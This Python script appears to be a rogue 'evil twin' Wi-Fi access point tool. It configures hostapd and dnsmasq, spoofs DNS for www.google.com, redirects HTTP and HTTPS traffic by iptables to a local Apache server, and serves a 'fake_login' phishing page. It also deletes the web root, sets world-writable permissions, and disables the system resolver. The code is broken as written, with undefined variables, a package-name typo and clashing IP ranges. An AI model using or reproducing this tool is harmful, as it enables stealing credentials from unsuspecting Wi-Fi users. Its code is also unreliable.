import os
import subprocess
from datetime import datetime
from string import Template

# from string import Template

from scapy.main import interact


def start_apache():
    os.system('sudo rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
    os.system('sudo cp -r fake_login/* /var/www/html')
    os.system('sudo chmod 777 /var/www/html/*')
    os.system('sudo chmod 777 /var/www/html')

    # update rules inside 000-default.conf of apache2
    os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
    os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
    os.system('service apache2 restart >/dev/null 2>&1')  # reload and restart apache2
    # time.sleep(1)


def install(wlan):
    os.system("apt install net tools")
    os.system("apt-get install hostapd dnsmasq apache2")


def hostapd(ssid):
    # kill all hostapd
    os.system('service hostapd stop >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    text = f'interface=wlan1\n' \
           f'driver=nl80211\n' \
           f'ssid={ssid}\n' \
           f'hw_mode=g\n' \
           f'channel=11\n' \
           f'macaddr_acl=0\n' \
           f'ignore_broadcast_ssid=0\n'
    # f'bssid={bssid}\n' \

    with open("conf/hostapd.conf", "w") as f:
        f.write(text)
    f.close()


def DNSmasq():
    # kill all dnsmasq files
    os.system('service dnsmasq stop >/dev/null 2>&1')
    os.system('killall dnsmasq >/dev/null 2>&1')
    text = f"interface=wlan1\n" \
           f"local=/localnet/\n" \
           f"server=/localnet/192.168.0.1\n" \
           f"domain=localnet\n" \
           f"dhcp-range=192.168.0.2, 192.168.0.30, 255.255.255.0, 12h\n " \
           f"dhcp-option=3 ,192.168.0.1\n" \
           f"dhcp-option=6 ,192.168.0.1\n" \
           f"address=/www.google.com/192.168.0.1\n" \
           f"server=8.8.8.8\n" \
           f"log-queries\n" \
           f"log-dhcp\n" \
           f"dhcp-authoritative\n" \
           f"listen-address=127.0.0.1"
    with open('conf/dnsmasq.conf', 'w') as f:
        f.write(text)
    f.close()


def conf_apache2():
    os.system('sudo chmod 777 /var/www/html')

    # update rules inside 000-default.conf of apache2
    os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
    os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
    os.system('service apache2 restart >/dev/null 2>&1')  # reload and restart apache2


# def make_new_af(interface,fakessid):
if __name__ == '__main__':
    os.system('service apache2 stop ')
    os.system('service hostapd stop ')
    os.system('service dnsmasq stop ')
    os.system("iwconfig")
    # interface = input("choose interface")
    # fakessid = "ben"
    # Clear port 53

    os.system("rm -rf build/")
    os.system('cp -r conf build')

    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')

    # Modify the hostapd.conf file with the access point interface and network name
    with open('build/hostapd.conf', 'r+') as f:
        template = Template(f.read())
        f.seek(0)
        f.write(template.substitute(INTERFACE=interface, NETWORK=fakessid))
        f.truncate()
    # Modify the dnsmasq.conf file with the access point interface
    with open('build/dnsmasq.conf', 'r+') as f:
        template = Template(f.read())
        f.seek(0)
        f.write(template.substitute(INTERFACE=interface))
        f.truncate()

    os.system(f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0")
    os.system(f"ip link set {interface} up")
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')

    # Redirect any request to the captive portal
    os.system(f'iptables -t nat -A PREROUTING  -i enp0s3 -p tcp --dport 80 -j DNAT  --to-destination 10.0.0.1:80')
    os.system(f'iptables -t nat -A PREROUTING  -i enp0s3 -p tcp --dport 443 -j DNAT  --to-destination 10.0.0.1:80')

    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system(f'sleep 3')

    os.system(f'route add default gw 10.0.0.1')
    os.system("hostapd build/hostapd.conf -d")

    os.system('service dnsmasq stop >/dev/null 2>&1')
    os.system('killall dnsmasq >/dev/null 2>&1')
    cmd = "sudo dnsmasq -C build/dnsmasq.conf -d"
    p = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)

    start_apache()
